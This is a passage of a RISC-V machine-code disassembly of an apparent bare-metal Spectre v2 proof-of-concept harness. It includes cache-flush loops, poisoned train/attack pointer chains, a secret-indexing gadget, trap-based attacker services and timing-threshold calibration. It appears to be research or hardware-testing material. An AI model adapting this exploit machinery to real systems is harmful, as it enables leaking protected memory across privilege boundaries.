    80000e2e:	00000013          	nop
    80000e32:	00000013          	nop
    80000e36:	00000013          	nop
    80000e3a:	00000013          	nop
    80000e3e:	0001                	nop

0000000080000e40 <v2_round_asm_impl>:
    80000e40:	fb010113          	addi	sp,sp,-80
    80000e44:	00113023          	sd	ra,0(sp)
    80000e48:	00913423          	sd	s1,8(sp)
    80000e4c:	01213823          	sd	s2,16(sp)
    80000e50:	01313c23          	sd	s3,24(sp)
    80000e54:	03413023          	sd	s4,32(sp)
    80000e58:	03513423          	sd	s5,40(sp)
    80000e5c:	03613823          	sd	s6,48(sp)
    80000e60:	00050a13          	mv	s4,a0
    80000e64:	00058493          	mv	s1,a1
    80000e68:	00006997          	auipc	s3,0x6
    80000e6c:	35898993          	addi	s3,s3,856 # 800071c0 <v2_public_dummy>
    80000e70:	01000913          	li	s2,16
    80000e74:	00006a97          	auipc	s5,0x6
    80000e78:	1cca8a93          	addi	s5,s5,460 # 80007040 <v2_train_root>
    80000e7c:	00006b17          	auipc	s6,0x6
    80000e80:	284b0b13          	addi	s6,s6,644 # 80007100 <v2_attack_root>
    80000e84:	000a4283          	lbu	t0,0(s4)
    80000e88:	00048313          	mv	t1,s1
    80000e8c:	00000293          	li	t0,0
    80000e90:	10000393          	li	t2,256
    80000e94:	0023200f          	cbo.flush	(t1)
    80000e98:	04030313          	addi	t1,t1,64
    80000e9c:	00128293          	addi	t0,t0,1
    80000ea0:	fe72eae3          	bltu	t0,t2,80000e94 <v2_round_asm_impl+0x54>
    80000ea4:	0330000f          	fence	rw,rw
    80000ea8:	00193e93          	seqz	t4,s2
    80000eac:	41d00eb3          	neg	t4,t4
    80000eb0:	0149cf33          	xor	t5,s3,s4
    80000eb4:	01df7f33          	and	t5,t5,t4
    80000eb8:	01e9c533          	xor	a0,s3,t5
    80000ebc:	016acf33          	xor	t5,s5,s6
    80000ec0:	01df7f33          	and	t5,t5,t4
    80000ec4:	01eace33          	xor	t3,s5,t5
    80000ec8:	00006297          	auipc	t0,0x6
    80000ecc:	17828293          	addi	t0,t0,376 # 80007040 <v2_train_root>
    80000ed0:	0022a00f          	cbo.flush	(t0)
    80000ed4:	00006297          	auipc	t0,0x6
    80000ed8:	1ac28293          	addi	t0,t0,428 # 80007080 <v2_train_mid>
    80000edc:	0022a00f          	cbo.flush	(t0)
    80000ee0:	00006297          	auipc	t0,0x6
    80000ee4:	1e028293          	addi	t0,t0,480 # 800070c0 <v2_train_node>
    80000ee8:	0022a00f          	cbo.flush	(t0)
    80000eec:	00006297          	auipc	t0,0x6
    80000ef0:	21428293          	addi	t0,t0,532 # 80007100 <v2_attack_root>
    80000ef4:	0022a00f          	cbo.flush	(t0)
    80000ef8:	00006297          	auipc	t0,0x6
    80000efc:	24828293          	addi	t0,t0,584 # 80007140 <v2_attack_mid>
    80000f00:	0022a00f          	cbo.flush	(t0)
    80000f04:	00006297          	auipc	t0,0x6
    80000f08:	27c28293          	addi	t0,t0,636 # 80007180 <v2_attack_node>
    80000f0c:	0022a00f          	cbo.flush	(t0)
    80000f10:	0330000f          	fence	rw,rw
    80000f14:	000e3383          	ld	t2,0(t3)
    80000f18:	0003b383          	ld	t2,0(t2)
    80000f1c:	0003b383          	ld	t2,0(t2)
    80000f20:	00000013          	nop
    80000f24:	00000013          	nop
    80000f28:	00000013          	nop
    80000f2c:	00000013          	nop
    80000f30:	00000013          	nop
    80000f34:	00000013          	nop
    80000f38:	00000013          	nop
    80000f3c:	00000013          	nop
    80000f40:	00038067          	jr	t2
    80000f44:	00000013          	nop
    80000f48:	00000013          	nop
    80000f4c:	00000013          	nop
    80000f50:	00000013          	nop
    80000f54:	00000013          	nop
    80000f58:	00000013          	nop
    80000f5c:	00000013          	nop
    80000f60:	00000013          	nop
    80000f64:	00000013          	nop
    80000f68:	00000013          	nop
    80000f6c:	00000013          	nop
    80000f70:	00000013          	nop
    80000f74:	00000013          	nop
    80000f78:	00000013          	nop
    80000f7c:	00000013          	nop

0000000080000f80 <v2_asm_gadget>:
    80000f80:	00054303          	lbu	t1,0(a0)
    80000f84:	00631313          	slli	t1,t1,0x6
    80000f88:	00648333          	add	t1,s1,t1
    80000f8c:	00034003          	lbu	zero,0(t1)
    80000f90:	0380006f          	j	80000fc8 <v2_asm_safe+0x8>
    80000f94:	00000013          	nop
    80000f98:	00000013          	nop
    80000f9c:	00000013          	nop
    80000fa0:	00000013          	nop
    80000fa4:	00000013          	nop
    80000fa8:	00000013          	nop
    80000fac:	00000013          	nop
    80000fb0:	00000013          	nop
    80000fb4:	00000013          	nop
    80000fb8:	00000013          	nop
    80000fbc:	00000013          	nop

0000000080000fc0 <v2_asm_safe>:
    80000fc0:	00157313          	andi	t1,a0,1
    80000fc4:	0040006f          	j	80000fc8 <v2_asm_safe+0x8>
    80000fc8:	00090663          	beqz	s2,80000fd4 <v2_asm_safe+0x14>
    80000fcc:	fff90913          	addi	s2,s2,-1
    80000fd0:	ed9ff06f          	j	80000ea8 <v2_round_asm_impl+0x68>
    80000fd4:	00013083          	ld	ra,0(sp)
    80000fd8:	00813483          	ld	s1,8(sp)
    80000fdc:	01013903          	ld	s2,16(sp)
    80000fe0:	01813983          	ld	s3,24(sp)
    80000fe4:	02013a03          	ld	s4,32(sp)
    80000fe8:	02813a83          	ld	s5,40(sp)
    80000fec:	03013b03          	ld	s6,48(sp)
    80000ff0:	05010113          	addi	sp,sp,80
    80000ff4:	00008067          	ret

0000000080000ff8 <init_v2_target_chain>:
    80000ff8:	1141                	addi	sp,sp,-16
    80000ffa:	e422                	sd	s0,8(sp)
    80000ffc:	0800                	addi	s0,sp,16
    80000ffe:	00006797          	auipc	a5,0x6
    80001002:	1c278793          	addi	a5,a5,450 # 800071c0 <v2_public_dummy>
    80001006:	00078023          	sb	zero,0(a5)
    8000100a:	00000717          	auipc	a4,0x0
    8000100e:	f7670713          	addi	a4,a4,-138 # 80000f80 <v2_asm_gadget>
    80001012:	00006797          	auipc	a5,0x6
    80001016:	0ae78793          	addi	a5,a5,174 # 800070c0 <v2_train_node>
    8000101a:	e398                	sd	a4,0(a5)
    8000101c:	00006717          	auipc	a4,0x6
    80001020:	0a470713          	addi	a4,a4,164 # 800070c0 <v2_train_node>
    80001024:	00006797          	auipc	a5,0x6
    80001028:	05c78793          	addi	a5,a5,92 # 80007080 <v2_train_mid>
    8000102c:	e398                	sd	a4,0(a5)
    8000102e:	00006717          	auipc	a4,0x6
    80001032:	05270713          	addi	a4,a4,82 # 80007080 <v2_train_mid>
    80001036:	00006797          	auipc	a5,0x6
    8000103a:	00a78793          	addi	a5,a5,10 # 80007040 <v2_train_root>
    8000103e:	e398                	sd	a4,0(a5)
    80001040:	00000717          	auipc	a4,0x0
    80001044:	f8070713          	addi	a4,a4,-128 # 80000fc0 <v2_asm_safe>
    80001048:	00006797          	auipc	a5,0x6
    8000104c:	13878793          	addi	a5,a5,312 # 80007180 <v2_attack_node>
    80001050:	e398                	sd	a4,0(a5)
    80001052:	00006717          	auipc	a4,0x6
    80001056:	12e70713          	addi	a4,a4,302 # 80007180 <v2_attack_node>
    8000105a:	00006797          	auipc	a5,0x6
    8000105e:	0e678793          	addi	a5,a5,230 # 80007140 <v2_attack_mid>
    80001062:	e398                	sd	a4,0(a5)
    80001064:	00006717          	auipc	a4,0x6
    80001068:	0dc70713          	addi	a4,a4,220 # 80007140 <v2_attack_mid>
    8000106c:	00006797          	auipc	a5,0x6
    80001070:	09478793          	addi	a5,a5,148 # 80007100 <v2_attack_root>
    80001074:	e398                	sd	a4,0(a5)
    80001076:	0001                	nop
    80001078:	6422                	ld	s0,8(sp)
    8000107a:	0141                	addi	sp,sp,16
    8000107c:	8082                	ret

000000008000107e <v2_round_asm_service>:
    8000107e:	1101                	addi	sp,sp,-32
    80001080:	ec06                	sd	ra,24(sp)
    80001082:	e822                	sd	s0,16(sp)
    80001084:	1000                	addi	s0,sp,32
    80001086:	fea43423          	sd	a0,-24(s0)
    8000108a:	feb43023          	sd	a1,-32(s0)
    8000108e:	fe843783          	ld	a5,-24(s0)
    80001092:	e799                	bnez	a5,800010a0 <v2_round_asm_service+0x22>
    80001094:	00006797          	auipc	a5,0x6
    80001098:	12c78793          	addi	a5,a5,300 # 800071c0 <v2_public_dummy>
    8000109c:	fef43423          	sd	a5,-24(s0)
    800010a0:	fe043583          	ld	a1,-32(s0)
    800010a4:	fe843503          	ld	a0,-24(s0)
    800010a8:	d99ff0ef          	jal	80000e40 <v2_round_asm_impl>
    800010ac:	0001                	nop
    800010ae:	60e2                	ld	ra,24(sp)
    800010b0:	6442                	ld	s0,16(sp)
    800010b2:	6105                	addi	sp,sp,32
    800010b4:	8082                	ret

00000000800010b6 <m_trap_dispatch>:
    800010b6:	7139                	addi	sp,sp,-64
    800010b8:	fc06                	sd	ra,56(sp)
    800010ba:	f822                	sd	s0,48(sp)
    800010bc:	0080                	addi	s0,sp,64
    800010be:	fea43423          	sd	a0,-24(s0)
    800010c2:	feb43023          	sd	a1,-32(s0)
    800010c6:	fcc43c23          	sd	a2,-40(s0)
    800010ca:	fcd43823          	sd	a3,-48(s0)
    800010ce:	fce43423          	sd	a4,-56(s0)
    800010d2:	0001a797          	auipc	a5,0x1a
    800010d6:	f3678793          	addi	a5,a5,-202 # 8001b008 <trap_count>
    800010da:	639c                	ld	a5,0(a5)
    800010dc:	00178713          	addi	a4,a5,1
    800010e0:	0001a797          	auipc	a5,0x1a
    800010e4:	f2878793          	addi	a5,a5,-216 # 8001b008 <trap_count>
    800010e8:	e398                	sd	a4,0(a5)
    800010ea:	0001a797          	auipc	a5,0x1a
    800010ee:	f5678793          	addi	a5,a5,-170 # 8001b040 <last_mcause>
    800010f2:	fe843703          	ld	a4,-24(s0)
    800010f6:	e398                	sd	a4,0(a5)
    800010f8:	0001a797          	auipc	a5,0x1a
    800010fc:	f5078793          	addi	a5,a5,-176 # 8001b048 <last_mepc>
    80001100:	fe043703          	ld	a4,-32(s0)
    80001104:	e398                	sd	a4,0(a5)
    80001106:	fe843703          	ld	a4,-24(s0)
    8000110a:	4795                	li	a5,5
    8000110c:	00f70763          	beq	a4,a5,8000111a <m_trap_dispatch+0x64>
    80001110:	fe843703          	ld	a4,-24(s0)
    80001114:	47b5                	li	a5,13
    80001116:	02f71563          	bne	a4,a5,80001140 <m_trap_dispatch+0x8a>
    8000111a:	00016797          	auipc	a5,0x16
    8000111e:	ee678793          	addi	a5,a5,-282 # 80017000 <direct_secret_fault_expected>
    80001122:	639c                	ld	a5,0(a5)
    80001124:	cf91                	beqz	a5,80001140 <m_trap_dispatch+0x8a>
    80001126:	00017797          	auipc	a5,0x17
    8000112a:	eda78793          	addi	a5,a5,-294 # 80018000 <direct_secret_fault_seen>
    8000112e:	4705                	li	a4,1
    80001130:	e398                	sd	a4,0(a5)
    80001132:	00016797          	auipc	a5,0x16
    80001136:	ece78793          	addi	a5,a5,-306 # 80017000 <direct_secret_fault_expected>
    8000113a:	0007b023          	sd	zero,0(a5)
    8000113e:	aa8d                	j	800012b0 <m_trap_dispatch+0x1fa>
    80001140:	fe843703          	ld	a4,-24(s0)
    80001144:	47a1                	li	a5,8
    80001146:	04f70063          	beq	a4,a5,80001186 <m_trap_dispatch+0xd0>
    8000114a:	fe843703          	ld	a4,-24(s0)
    8000114e:	47a5                	li	a5,9
    80001150:	02f70b63          	beq	a4,a5,80001186 <m_trap_dispatch+0xd0>
    80001154:	0001a797          	auipc	a5,0x1a
    80001158:	ee478793          	addi	a5,a5,-284 # 8001b038 <bad_trap_count>
    8000115c:	639c                	ld	a5,0(a5)
    8000115e:	00178713          	addi	a4,a5,1
    80001162:	0001a797          	auipc	a5,0x1a
    80001166:	ed678793          	addi	a5,a5,-298 # 8001b038 <bad_trap_count>
    8000116a:	e398                	sd	a4,0(a5)
    8000116c:	0001a797          	auipc	a5,0x1a
    80001170:	ee878793          	addi	a5,a5,-280 # 8001b054 <attack_status>
    80001174:	4709                	li	a4,2
    80001176:	c398                	sw	a4,0(a5)
    80001178:	0001a797          	auipc	a5,0x1a
    8000117c:	ed878793          	addi	a5,a5,-296 # 8001b050 <attack_done>
    80001180:	4705                	li	a4,1
    80001182:	c398                	sw	a4,0(a5)
    80001184:	a235                	j	800012b0 <m_trap_dispatch+0x1fa>
    80001186:	fc843703          	ld	a4,-56(s0)
    8000118a:	4785                	li	a5,1
    8000118c:	02f71163          	bne	a4,a5,800011ae <m_trap_dispatch+0xf8>
    80001190:	0001a797          	auipc	a5,0x1a
    80001194:	e8078793          	addi	a5,a5,-384 # 8001b010 <train_call_count>
    80001198:	639c                	ld	a5,0(a5)
    8000119a:	00178713          	addi	a4,a5,1
    8000119e:	0001a797          	auipc	a5,0x1a
    800011a2:	e7278793          	addi	a5,a5,-398 # 8001b010 <train_call_count>
    800011a6:	e398                	sd	a4,0(a5)
    800011a8:	b6dff0ef          	jal	80000d14 <train_service>
    800011ac:	a211                	j	800012b0 <m_trap_dispatch+0x1fa>
    800011ae:	fc843703          	ld	a4,-56(s0)
    800011b2:	4789                	li	a5,2
    800011b4:	02f71463          	bne	a4,a5,800011dc <m_trap_dispatch+0x126>
    800011b8:	0001a797          	auipc	a5,0x1a
    800011bc:	e6078793          	addi	a5,a5,-416 # 8001b018 <attack_call_count>
    800011c0:	639c                	ld	a5,0(a5)
    800011c2:	00178713          	addi	a4,a5,1
    800011c6:	0001a797          	auipc	a5,0x1a
    800011ca:	e5278793          	addi	a5,a5,-430 # 8001b018 <attack_call_count>
    800011ce:	e398                	sd	a4,0(a5)
    800011d0:	fd843783          	ld	a5,-40(s0)
    800011d4:	853e                	mv	a0,a5
    800011d6:	bc7ff0ef          	jal	80000d9c <attack_service>
    800011da:	a8d9                	j	800012b0 <m_trap_dispatch+0x1fa>
    800011dc:	fc843703          	ld	a4,-56(s0)
    800011e0:	478d                	li	a5,3
    800011e2:	02f71463          	bne	a4,a5,8000120a <m_trap_dispatch+0x154>
    800011e6:	0001a797          	auipc	a5,0x1a
    800011ea:	e4278793          	addi	a5,a5,-446 # 8001b028 <flush_call_count>
    800011ee:	639c                	ld	a5,0(a5)
    800011f0:	00178713          	addi	a4,a5,1
    800011f4:	0001a797          	auipc	a5,0x1a
    800011f8:	e3478793          	addi	a5,a5,-460 # 8001b028 <flush_call_count>
    800011fc:	e398                	sd	a4,0(a5)
    800011fe:	fd843783          	ld	a5,-40(s0)
    80001202:	853e                	mv	a0,a5
    80001204:	abdff0ef          	jal	80000cc0 <flush_channel_service>
    80001208:	a065                	j	800012b0 <m_trap_dispatch+0x1fa>
    8000120a:	fc843703          	ld	a4,-56(s0)
    8000120e:	4795                	li	a5,5
    80001210:	02f71763          	bne	a4,a5,8000123e <m_trap_dispatch+0x188>
    80001214:	0001a797          	auipc	a5,0x1a
    80001218:	e0c78793          	addi	a5,a5,-500 # 8001b020 <asm_round_call_count>
    8000121c:	639c                	ld	a5,0(a5)
    8000121e:	00178713          	addi	a4,a5,1
    80001222:	0001a797          	auipc	a5,0x1a
    80001226:	dfe78793          	addi	a5,a5,-514 # 8001b020 <asm_round_call_count>
    8000122a:	e398                	sd	a4,0(a5)
    8000122c:	fd843783          	ld	a5,-40(s0)
    80001230:	fd043703          	ld	a4,-48(s0)
    80001234:	85ba                	mv	a1,a4
    80001236:	853e                	mv	a0,a5
    80001238:	e47ff0ef          	jal	8000107e <v2_round_asm_service>
    8000123c:	a895                	j	800012b0 <m_trap_dispatch+0x1fa>
    8000123e:	fc843703          	ld	a4,-56(s0)
    80001242:	4791                	li	a5,4
    80001244:	02f71e63          	bne	a4,a5,80001280 <m_trap_dispatch+0x1ca>
    80001248:	0001a797          	auipc	a5,0x1a
    8000124c:	de878793          	addi	a5,a5,-536 # 8001b030 <exit_call_count>
    80001250:	639c                	ld	a5,0(a5)
    80001252:	00178713          	addi	a4,a5,1
    80001256:	0001a797          	auipc	a5,0x1a
    8000125a:	dda78793          	addi	a5,a5,-550 # 8001b030 <exit_call_count>
    8000125e:	e398                	sd	a4,0(a5)
    80001260:	fd843783          	ld	a5,-40(s0)
    80001264:	0007871b          	sext.w	a4,a5
    80001268:	0001a797          	auipc	a5,0x1a
    8000126c:	dec78793          	addi	a5,a5,-532 # 8001b054 <attack_status>
    80001270:	c398                	sw	a4,0(a5)
    80001272:	0001a797          	auipc	a5,0x1a
    80001276:	dde78793          	addi	a5,a5,-546 # 8001b050 <attack_done>
    8000127a:	4705                	li	a4,1
    8000127c:	c398                	sw	a4,0(a5)
    8000127e:	a80d                	j	800012b0 <m_trap_dispatch+0x1fa>
    80001280:	0001a797          	auipc	a5,0x1a
    80001284:	db878793          	addi	a5,a5,-584 # 8001b038 <bad_trap_count>
    80001288:	639c                	ld	a5,0(a5)
    8000128a:	00178713          	addi	a4,a5,1
    8000128e:	0001a797          	auipc	a5,0x1a
    80001292:	daa78793          	addi	a5,a5,-598 # 8001b038 <bad_trap_count>
    80001296:	e398                	sd	a4,0(a5)
    80001298:	0001a797          	auipc	a5,0x1a
    8000129c:	dbc78793          	addi	a5,a5,-580 # 8001b054 <attack_status>
    800012a0:	470d                	li	a4,3
    800012a2:	c398                	sw	a4,0(a5)
    800012a4:	0001a797          	auipc	a5,0x1a
    800012a8:	dac78793          	addi	a5,a5,-596 # 8001b050 <attack_done>
    800012ac:	4705                	li	a4,1
    800012ae:	c398                	sw	a4,0(a5)
    800012b0:	70e2                	ld	ra,56(sp)
    800012b2:	7442                	ld	s0,48(sp)
    800012b4:	6121                	addi	sp,sp,64
    800012b6:	8082                	ret

00000000800012b8 <m_trap_entry>:
    800012b8:	7119                	addi	sp,sp,-128
    800012ba:	e006                	sd	ra,0(sp)
    800012bc:	e416                	sd	t0,8(sp)
    800012be:	e81a                	sd	t1,16(sp)
    800012c0:	ec1e                	sd	t2,24(sp)
    800012c2:	f02a                	sd	a0,32(sp)
    800012c4:	f42e                	sd	a1,40(sp)
    800012c6:	f832                	sd	a2,48(sp)
    800012c8:	fc36                	sd	a3,56(sp)
    800012ca:	e0ba                	sd	a4,64(sp)
    800012cc:	e4be                	sd	a5,72(sp)
    800012ce:	e8c2                	sd	a6,80(sp)
    800012d0:	ecc6                	sd	a7,88(sp)
    800012d2:	34202573          	csrr	a0,mcause
    800012d6:	341025f3          	csrr	a1,mepc
    800012da:	7602                	ld	a2,32(sp)
    800012dc:	76a2                	ld	a3,40(sp)
    800012de:	6766                	ld	a4,88(sp)
    800012e0:	dd7ff0ef          	jal	800010b6 <m_trap_dispatch>
    800012e4:	0001a297          	auipc	t0,0x1a
    800012e8:	d6c28293          	addi	t0,t0,-660 # 8001b050 <attack_done>
    800012ec:	0002a303          	lw	t1,0(t0)
    800012f0:	02031663          	bnez	t1,8000131c <m_trap_entry+0x64>
    800012f4:	341022f3          	csrr	t0,mepc
    800012f8:	0291                	addi	t0,t0,4
    800012fa:	34129073          	csrw	mepc,t0
    800012fe:	6082                	ld	ra,0(sp)
    80001300:	62a2                	ld	t0,8(sp)
    80001302:	6342                	ld	t1,16(sp)
    80001304:	63e2                	ld	t2,24(sp)
    80001306:	7502                	ld	a0,32(sp)
    80001308:	75a2                	ld	a1,40(sp)
    8000130a:	7642                	ld	a2,48(sp)
    8000130c:	76e2                	ld	a3,56(sp)
    8000130e:	6706                	ld	a4,64(sp)
    80001310:	67a6                	ld	a5,72(sp)
    80001312:	6846                	ld	a6,80(sp)
    80001314:	68e6                	ld	a7,88(sp)
    80001316:	6109                	addi	sp,sp,128
    80001318:	30200073          	mret
    8000131c:	00000297          	auipc	t0,0x0
    80001320:	09c28293          	addi	t0,t0,156 # 800013b8 <machine_low_return>
    80001324:	34129073          	csrw	mepc,t0
    80001328:	6289                	lui	t0,0x2
    8000132a:	8002829b          	addiw	t0,t0,-2048 # 1800 <i+0x17e0>
    8000132e:	3002a073          	csrs	mstatus,t0
    80001332:	30200073          	mret

0000000080001336 <enter_user_attacker>:
    80001336:	1101                	addi	sp,sp,-32
    80001338:	ec06                	sd	ra,24(sp)
    8000133a:	e822                	sd	s0,16(sp)
    8000133c:	1000                	addi	s0,sp,32
    8000133e:	0000b717          	auipc	a4,0xb
    80001342:	cc270713          	addi	a4,a4,-830 # 8000c000 <u_stack>
    80001346:	6791                	lui	a5,0x4
    80001348:	17c1                	addi	a5,a5,-16 # 3ff0 <i+0x3fd0>
    8000134a:	97ba                	add	a5,a5,a4
    8000134c:	fef43423          	sd	a5,-24(s0)
    80001350:	3ed020ef          	jal	80003f3c <init_pmp>
    80001354:	00000797          	auipc	a5,0x0
    80001358:	f6478793          	addi	a5,a5,-156 # 800012b8 <m_trap_entry>
    8000135c:	30579073          	csrw	mtvec,a5
    80001360:	30201073          	csrw	medeleg,zero
    80001364:	30301073          	csrw	mideleg,zero
    80001368:	52fd                	li	t0,-1
    8000136a:	30629073          	csrw	mcounteren,t0
    8000136e:	10629073          	csrw	scounteren,t0
    80001372:	aaaff0ef          	jal	8000061c <install_priv_page_table>
    80001376:	870a                	mv	a4,sp
    80001378:	0001a797          	auipc	a5,0x1a
    8000137c:	ce078793          	addi	a5,a5,-800 # 8001b058 <saved_m_sp>
    80001380:	e398                	sd	a4,0(a5)
    80001382:	300027f3          	csrr	a5,mstatus
    80001386:	fef43023          	sd	a5,-32(s0)
    8000138a:	fe043703          	ld	a4,-32(s0)
    8000138e:	77f9                	lui	a5,0xffffe
    80001390:	7ff78793          	addi	a5,a5,2047 # ffffffffffffe7ff <_pmem_end+0xffffffff3fffe7ff>
    80001394:	8ff9                	and	a5,a5,a4
    80001396:	fef43023          	sd	a5,-32(s0)
    8000139a:	fe043783          	ld	a5,-32(s0)
    8000139e:	30079073          	csrw	mstatus,a5
    800013a2:	00001717          	auipc	a4,0x1
    800013a6:	39e70713          	addi	a4,a4,926 # 80002740 <attacker_entry>
    800013aa:	fe843783          	ld	a5,-24(s0)
    800013ae:	813e                	mv	sp,a5
    800013b0:	34171073          	csrw	mepc,a4
    800013b4:	30200073          	mret

00000000800013b8 <machine_low_return>:
    800013b8:	0001a297          	auipc	t0,0x1a
    800013bc:	ca028293          	addi	t0,t0,-864 # 8001b058 <saved_m_sp>
    800013c0:	0002b103          	ld	sp,0(t0)
    800013c4:	0001                	nop
    800013c6:	60e2                	ld	ra,24(sp)
    800013c8:	6442                	ld	s0,16(sp)
    800013ca:	6105                	addi	sp,sp,32
    800013cc:	8082                	ret

00000000800013ce <main>:
    800013ce:	7135                	addi	sp,sp,-160
    800013d0:	ed06                	sd	ra,152(sp)
    800013d2:	e922                	sd	s0,144(sp)
    800013d4:	1100                	addi	s0,sp,160
    800013d6:	fe043423          	sd	zero,-24(s0)
    800013da:	a00d                	j	800013fc <main+0x2e>
    800013dc:	fe843783          	ld	a5,-24(s0)
    800013e0:	079a                	slli	a5,a5,0x6
    800013e2:	00007717          	auipc	a4,0x7
    800013e6:	c1e70713          	addi	a4,a4,-994 # 80008000 <channel>
    800013ea:	97ba                	add	a5,a5,a4
    800013ec:	4705                	li	a4,1
    800013ee:	00e78023          	sb	a4,0(a5)
    800013f2:	fe843783          	ld	a5,-24(s0)
    800013f6:	0785                	addi	a5,a5,1
    800013f8:	fef43423          	sd	a5,-24(s0)
    800013fc:	fe843703          	ld	a4,-24(s0)
    80001400:	0ff00793          	li	a5,255
    80001404:	fce7fce3          	bgeu	a5,a4,800013dc <main+0xe>
    80001408:	bf1ff0ef          	jal	80000ff8 <init_v2_target_chain>
    8000140c:	04000593          	li	a1,64
    80001410:	00007517          	auipc	a0,0x7
    80001414:	bf050513          	addi	a0,a0,-1040 # 80008000 <channel>
    80001418:	e05fe0ef          	jal	8000021c <xs_calibrate_threshold>
    8000141c:	fca43823          	sd	a0,-48(s0)
    80001420:	00015797          	auipc	a5,0x15
    80001424:	be078793          	addi	a5,a5,-1056 # 80016000 <active_threshold>
    80001428:	fd043703          	ld	a4,-48(s0)
    8000142c:	e398                	sd	a4,0(a5)
    8000142e:	00015797          	auipc	a5,0x15
    80001432:	bd278793          	addi	a5,a5,-1070 # 80016000 <active_threshold>
    80001436:	04600713          	li	a4,70
    8000143a:	e398                	sd	a4,0(a5)
    8000143c:	e882                	sd	zero,80(sp)
    8000143e:	e482                	sd	zero,72(sp)
    80001440:	4785                	li	a5,1
    80001442:	e0be                	sd	a5,64(sp)
    80001444:	fc02                	sd	zero,56(sp)
    80001446:	f802                	sd	zero,48(sp)
    80001448:	f402                	sd	zero,40(sp)
    8000144a:	47c1                	li	a5,16
    8000144c:	f03e                	sd	a5,32(sp)
    8000144e:	47a1                	li	a5,8
    80001450:	ec3e                	sd	a5,24(sp)
    80001452:	03e00793          	li	a5,62
    80001456:	e83e                	sd	a5,16(sp)
    80001458:	4785                	li	a5,1
    8000145a:	e43e                	sd	a5,8(sp)
    8000145c:	4795                	li	a5,5
    8000145e:	e03e                	sd	a5,0(sp)
    80001460:	58fd                	li	a7,-1
    80001462:	00005817          	auipc	a6,0x5
    80001466:	24e80813          	addi	a6,a6,590 # 800066b0 <printf_+0x9aa>
    8000146a:	00005797          	auipc	a5,0x5
    8000146e:	25678793          	addi	a5,a5,598 # 800066c0 <printf_+0x9ba>
    80001472:	00005717          	auipc	a4,0x5
    80001476:	25e70713          	addi	a4,a4,606 # 800066d0 <printf_+0x9ca>
    8000147a:	00005697          	auipc	a3,0x5
    8000147e:	25e68693          	addi	a3,a3,606 # 800066d8 <printf_+0x9d2>
    80001482:	00005617          	auipc	a2,0x5
    80001486:	26660613          	addi	a2,a2,614 # 800066e8 <printf_+0x9e2>
    8000148a:	00005597          	auipc	a1,0x5
    8000148e:	26658593          	addi	a1,a1,614 # 800066f0 <printf_+0x9ea>
    80001492:	00005517          	auipc	a0,0x5
    80001496:	27650513          	addi	a0,a0,630 # 80006708 <printf_+0xa02>
    8000149a:	06d040ef          	jal	80005d06 <printf_>
    8000149e:	00015797          	auipc	a5,0x15
    800014a2:	b6278793          	addi	a5,a5,-1182 # 80016000 <active_threshold>
    800014a6:	639c                	ld	a5,0(a5)
    800014a8:	4705                	li	a4,1
    800014aa:	86be                	mv	a3,a5
    800014ac:	fd043603          	ld	a2,-48(s0)
    800014b0:	04600593          	li	a1,70
    800014b4:	00005517          	auipc	a0,0x5
    800014b8:	37c50513          	addi	a0,a0,892 # 80006830 <printf_+0xb2a>
    800014bc:	04b040ef          	jal	80005d06 <printf_>
    800014c0:	00005597          	auipc	a1,0x5
    800014c4:	3c058593          	addi	a1,a1,960 # 80006880 <printf_+0xb7a>
    800014c8:	00005517          	auipc	a0,0x5
    800014cc:	3c850513          	addi	a0,a0,968 # 80006890 <printf_+0xb8a>
    800014d0:	037040ef          	jal	80005d06 <printf_>
    800014d4:	fffff717          	auipc	a4,0xfffff
    800014d8:	6f870713          	addi	a4,a4,1784 # 80000bcc <safe_target>
    800014dc:	fffff697          	auipc	a3,0xfffff
    800014e0:	68e68693          	addi	a3,a3,1678 # 80000b6a <gadget>
    800014e4:	00007617          	auipc	a2,0x7
    800014e8:	b1c60613          	addi	a2,a2,-1252 # 80008000 <channel>
    800014ec:	00006597          	auipc	a1,0x6
    800014f0:	b1458593          	addi	a1,a1,-1260 # 80007000 <secret>
    800014f4:	00005517          	auipc	a0,0x5
    800014f8:	3ec50513          	addi	a0,a0,1004 # 800068e0 <printf_+0xbda>
    800014fc:	00b040ef          	jal	80005d06 <printf_>
    80001500:	e37ff0ef          	jal	80001336 <enter_user_attacker>
    80001504:	00017797          	auipc	a5,0x17
    80001508:	afc78793          	addi	a5,a5,-1284 # 80018000 <direct_secret_fault_seen>
    8000150c:	638c                	ld	a1,0(a5)
    8000150e:	00018797          	auipc	a5,0x18
    80001512:	af278793          	addi	a5,a5,-1294 # 80019000 <direct_secret_read_completed>
    80001516:	6390                	ld	a2,0(a5)
    80001518:	00019797          	auipc	a5,0x19
    8000151c:	ae878793          	addi	a5,a5,-1304 # 8001a000 <direct_secret_read_value>
    80001520:	639c                	ld	a5,0(a5)
    80001522:	0ff7f693          	zext.b	a3,a5
    80001526:	00006897          	auipc	a7,0x6
    8000152a:	ada88893          	addi	a7,a7,-1318 # 80007000 <secret>
    8000152e:	00002817          	auipc	a6,0x2
    80001532:	ad280813          	addi	a6,a6,-1326 # 80003000 <__u_text_end>
    80001536:	00001797          	auipc	a5,0x1
    8000153a:	aca78793          	addi	a5,a5,-1334 # 80002000 <is_candidate_value>
    8000153e:	00005717          	auipc	a4,0x5
    80001542:	3e270713          	addi	a4,a4,994 # 80006920 <printf_+0xc1a>
    80001546:	00005517          	auipc	a0,0x5
    8000154a:	3e250513          	addi	a0,a0,994 # 80006928 <printf_+0xc22>
    8000154e:	7b8040ef          	jal	80005d06 <printf_>
    80001552:	0001a797          	auipc	a5,0x1a
    80001556:	ab678793          	addi	a5,a5,-1354 # 8001b008 <trap_count>
    8000155a:	638c                	ld	a1,0(a5)
    8000155c:	0001a797          	auipc	a5,0x1a
    80001560:	ab478793          	addi	a5,a5,-1356 # 8001b010 <train_call_count>
    80001564:	6390                	ld	a2,0(a5)
    80001566:	0001a797          	auipc	a5,0x1a
    8000156a:	ab278793          	addi	a5,a5,-1358 # 8001b018 <attack_call_count>
    8000156e:	6394                	ld	a3,0(a5)
    80001570:	0001a797          	auipc	a5,0x1a
    80001574:	ab078793          	addi	a5,a5,-1360 # 8001b020 <asm_round_call_count>
    80001578:	6388                	ld	a0,0(a5)
    8000157a:	0001a797          	auipc	a5,0x1a
    8000157e:	aae78793          	addi	a5,a5,-1362 # 8001b028 <flush_call_count>
    80001582:	0007b303          	ld	t1,0(a5)
    80001586:	0001a797          	auipc	a5,0x1a
    8000158a:	aaa78793          	addi	a5,a5,-1366 # 8001b030 <exit_call_count>
    8000158e:	0007b803          	ld	a6,0(a5)
    80001592:	0001a797          	auipc	a5,0x1a
